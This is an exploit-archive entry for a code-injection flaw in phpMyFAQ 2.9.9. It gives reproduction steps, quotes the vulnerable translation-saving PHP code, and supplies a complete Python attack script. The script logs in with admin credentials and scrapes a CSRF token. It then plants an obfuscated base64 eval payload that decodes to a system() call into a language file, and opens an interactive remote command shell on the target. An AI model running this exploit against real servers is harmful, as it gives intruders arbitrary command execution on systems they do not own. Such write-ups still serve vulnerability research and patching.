@@ -1,0 +1,257 @@
+id: 29018
+date: 11/19/2017
+title: phpMyFAQ 2.9.9 Code Injection Exploit
+author: tomplixsee
+cves: 
+
+# Exploit Title: [PHPMYFAQ 2.9.9 Code Injection]
+# Google Dork: [NA]
+# Date: [Nov 6 2017]
+# Exploit Author: [tomplixsee]
+# Author blog : [cupuzone.wordpress.com]
+# Vendor Homepage: [ http://www.phpmyfaq.de]
+# Software Link: [http://download.phpmyfaq.de/phpMyFAQ-2.9.9.zip]
+# Version: [2.9.9] 
+# Tested on: [Ubuntu Server 16.04, PHP 7.0.22]
+# CVE : [NA]
+
+
+How to reproduce
+1. login to administrative page (example http://vbox-ubuntu-server.me/phpmyfaq/admin/ ) as an admin or any user with right access to edit translation
+2. open page configuration->interface translation (assume you use english language). fyi, edit translations only active if folder phpmyfaq/lang is writable, so make sure the folder is writable
+3. choose indonesia (or another language) to edit
+4. choose page 14 (in example)
+5. choose variable LANG_CONF[main.metaDescription]
+6. set phpinfo() as value
+7. change your languge to indonesia
+
+
+vulnerable code
+on file admin/ajax.trans.php
+
+    43      case 'save_page_buffer':
+    44          /*
+    45           * Build language variable definitions
+    46           * @todo Change input handling using PMF_Filter
+    47           */
+    48          foreach ((array) @$_POST['PMF_LANG'] as $key => $val) {
+    49              if (is_string($val)) {
+    50                  $val = str_replace(array('\\\\', '\"', '\\\''), array('\\', '"', "'"), $val);
+    51                  $val = str_replace("'", "\\'", $val);
+    52                  $_SESSION['trans']['rightVarsOnly']["PMF_LANG[$key]"] = $val;
+    53              } elseif (is_array($val)) {
+    54                  /*
+    55                   * Here we deal with a two dimensional array
+    56                   */
+    57                  foreach ($val as $key2 => $val2) {
+    58                      $val2 = str_replace(array('\\\\', '\"', '\\\''), array('\\', '"', "'"), $val2);
+    59                      $val2 = str_replace("'", "\\'", $val2);
+    60                      $_SESSION['trans']['rightVarsOnly']["PMF_LANG[$key][$key2]"] = $val2;
+    61                  }
+    62              }
+    63          }
+    64  
+    65          foreach ((array) @$_POST['LANG_CONF'] as $key => $val) {
+    66              // if string like array(blah-blah-blah), extract the contents inside the brackets
+    67              if (preg_match('/^\s*array\s*\(\s*(\d+.+)\s*\).*$/', $val, $matches1)) {
+    68                  // split the resulting string of delimiters such as "number =>"
+    69                  $valArr = preg_split(
+    70                      '/\s*(\d+)\s*\=\>\s*/',
+    71                      $matches1[1],
+    72                      null,
+    73                      PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY
+    74                  );
+    75                  $numVal = count($valArr);
+    76                  if ($numVal > 1) {
+    77                      $newValArr = [];
+    78                      for ($i = 0; $i < $numVal; $i += 2) {
+    79                          if (is_numeric($valArr[$i])) {
+    80                              // clearing quotes
+    81                              if (preg_match('/^\s*\\\\*[\"|\'](.+)\\\\*[\"|\'][\s\,]*$/', $valArr[$i + 1], $matches2)) {
+    82                                  $subVal = $matches2[1];
+    83                                  // normalize quotes
+    84                                  $subVal = str_replace(array('\\\\', '\"', '\\\''), array('\\', '"', "'"), $subVal);
+    85                                  $subVal = str_replace("'", "\\'", $subVal);
+    86                                  // assembly of the original substring back
+    87                                  $newValArr[] = $valArr[$i].' => \''.$subVal.'\'';
+    88                              }
+    89                          }
+    90                      }
+    91                      $_SESSION['trans']['rightVarsOnly']["LANG_CONF[$key]"] = 'array('.implode(', ', $newValArr).')';
+    92                  }
+    93              } else {  // compatibility for old behavior
+    94                  $val = str_replace(array('\\\\', '\"', '\\\''), array('\\', '"', "'"), $val);
+    95                  $val = str_replace("'", "\\'", $val);
+    96                  $_SESSION['trans']['rightVarsOnly']["LANG_CONF[$key]"] = $val;
+    97              }
+    98          }
+    99  
+   100          echo 1;
+   101      break;
+   102      
+   103      case 'save_translated_lang':
+   104  
+   105          if (!$user->perm->checkRight($user->getUserId(), 'edittranslation')) {
+   106              echo $PMF_LANG['err_NotAuth'];
+   107              exit;
+   108          }
+   109  
+   110          $lang = strtolower($_SESSION['trans']['rightVarsOnly']['PMF_LANG[metaLanguage]']);
+   111          $filename = PMF_ROOT_DIR.'/lang/language_'.$lang.'.php';
+   112  
+   113          if (!is_writable(PMF_ROOT_DIR.'/lang')) {
+   114              echo 0;
+   115              exit;
+   116          }
+   117  
+   118          if (!copy($filename, PMF_ROOT_DIR.'/lang/language_'.$lang.'.bak.php')) {
+   119              echo 0;
+   120              exit;
+   121          }
+   122  
+   123          $newFileContents = '';
+   124          $tmpLines = [];
+   125  
+   126          // Read in the head of the file we're writing to
+   127          $fh = fopen($filename, 'r');
+   128          do {
+   129              $line = fgets($fh);
+   130              array_push($tmpLines, rtrim($line));
+   131          } while ('*/' != substr(trim($line), -2));
+   132          fclose($fh);
+   133  
+   134          // Construct lines with variable definitions
+   135          foreach ($_SESSION['trans']['rightVarsOnly'] as $key => $val) {
+   136              if (0 === strpos($key, 'PMF_LANG')) {
+   137                  $val = "'$val'";
+   138              }
+   139              array_push($tmpLines, '$'.str_replace(array('[', ']'), array("['", "']"), $key)." = $val;");
+   140          }
+   141  
+   142          $newFileContents .= implode("\n", $tmpLines);
+   143  
+   144          unset($_SESSION['trans']);
+   145  
+   146          $retval = file_put_contents($filename, $newFileContents);
+   147          echo intval($retval);
+   148          break;
+
+
+
+
+the exploit
+-----------------------------------------------------------------
+
+
+#! /usr/bin/python
+import sys, requests, argparse, readline
+  
+def main(argv):
+  global url, user, password
+  parser = argparse.ArgumentParser(description='PHPMYFAQ 2.9.9 Code Injection exploitation tool. author : tomplixsee')
+  parser.add_argument('-u','--url', help='target url',required=True)
+  parser.add_argument('-p','--password', help='password',required=True)
+  parser.add_argument('-s','--user', help='user',required=True)
+  args = parser.parse_args()
+  
+  url = args.url
+  user = args.user
+  password = args.password
+
+if __name__ == "__main__":
+  main(sys.argv[1:])
+
+#get the cookie
+def login():
+  global url, user, password,cookie
+  print "\033[1;33m>>>>>> logging in\033[1;m"
+  data = {"faqusername":user,"faqpassword":password}
+  headers = {
+  }
+  r = requests.post(url+"/admin/index.php", headers=headers, data=data)
+  if "dashboard" in r.text:
+    print "\033[1;32m>>>>>> login sucessful\033[1;m"
+    cookie = r.cookies["PHPSESSID"]
+    check()
+  else:
+    print "login failed"
+    sys.exit()
+
+#check if user has access to edit translations. 
+#get the crsf token  
+def check():
+  global url,cookie, csrf
+  print "\033[1;33m>>>>>> check user auth\033[1;m"
+  headers = {
+    'Accept': '*/*',
+    "Cookie":"PHPSESSID="+cookie
+  }
+  r = requests.get(url+"/admin/index.php?action=transedit&translang=id", headers=headers)
+  if ("You are not authorized." not in r.text) or ("ajaxaction=save_translated_lang&csrf" in r.text):
+    print "\033[1;32m>>>>>> authorized\033[1;m"
+  else:
+    print "not authorized"
+    sys.exit()
+  #get csrf token
+  str_csrf = r.text.split("action=ajax&ajax=trans&ajaxaction=save_translated_lang&csrf=" )
+  csrf = str_csrf[1][0:40]
+  savebuffer()
+
+#save payload to session
+def savebuffer():
+  global url,cookie, csrf
+  print "\033[1;33m>>>>>> trying to fill the buffer\033[1;m"
+  headers = {
+    'Accept': '*/*',
+    "Cookie":"PHPSESSID="+cookie
+  }
+  data = {
+    "LANG_CONF[main.metaDescription]":'eval(base64_decode(\"c3lzdGVtKCRfUkVRVUVTVFtxXSk7IGlmKGlzc2V0KCRfUkVRVUVTVFttYXRpXSkpZGllOw==\"))'
+  }
+  r = requests.post(url+"/admin/index.php?action=ajax&ajax=trans&ajaxaction=save_page_buffer&csrf="+csrf, headers=headers, data=data)
+  if r.text=="1":
+    print "\033[1;32m>>>>>> success\033[1;m"
+    write2file()
+  else:
+    sys.exit()
+    
+#write payload to file
+def write2file():
+  global url,cookie, csrf
+  print "\033[1;33m>>>>>> write payload to server\033[1;m"
+  headers = {
+    'Accept': '*/*',
+    "Cookie":"PHPSESSID="+cookie
+  }
+  data = {}
+  r = requests.post(url+"/admin/index.php?action=ajax&ajax=trans&ajaxaction=save_translated_lang&csrf="+csrf, headers=headers, data=data)
+  if r.text!="":
+    print "\033[1;32m>>>>>> success\033[1;m"
+    print "\033[1;32m>>>>>> enjoy your shell\033[1;m"
+    exploit('')
+  else:
+    sys.exit()
+
+#send system command
+def exploit(command):
+  global url,cookie
+  command = raw_input('\033[1;31mshell > \033[1;m') 
+  if command == "exit":
+    print "goodbye"
+    sys.exit()
+    
+  headers = {
+    'Accept': '*/*',
+    "Cookie":"PHPSESSID="+cookie
+  }
+  data = {"q":command,
+  "mati":"mati",
+  "language":"id"
+  }
+  r = requests.post(url+"/admin/index.php", headers=headers, data=data)
+  print r.text
+  exploit('')
+    
+login()
+
+#  0day.today [2023-03-23]  #
